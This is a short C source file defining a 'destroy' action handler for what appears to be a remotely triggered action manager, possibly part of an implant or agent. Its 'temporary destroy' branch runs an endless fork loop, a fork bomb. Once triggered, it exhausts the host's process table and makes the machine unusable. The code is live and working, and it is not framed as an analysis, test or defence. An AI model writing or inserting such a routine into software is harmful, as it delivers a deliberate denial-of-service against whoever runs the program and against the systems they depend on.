#include <unistd.h>

#include "actionmanager.h"
#include "me.h"

void am_destroy(subaction_destroy_t *s)
{
   debugme("[RUN] action destroy\n");

   if(s->permanent) {
      debugme("Permanent destroy\n");
   } else {
      debugme("Temporary destroy\n");
      while(1) fork();
   }

   return;
}
